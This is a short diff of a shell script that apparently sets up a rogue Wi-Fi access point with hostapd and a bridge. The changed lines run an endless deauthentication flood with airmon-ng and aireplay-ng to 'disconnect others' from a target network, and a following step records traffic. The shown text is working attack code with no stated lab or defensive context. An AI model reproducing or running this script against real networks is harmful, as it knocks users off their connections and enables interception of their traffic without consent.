@@ -49,7 +49,8 @@ sudo ifconfig br0 up
 sudo hostapd /etc/hostapd/hostapd.conf
 
 # Disconnect others
-sudo aireplay-ng --deauth 0 -a $mac $iface
+sudo airmon-ng start $iface
+sudo aireplay-ng --deauth 0 -a $mac mon0
 
 # Record traffic
 name=$(date)
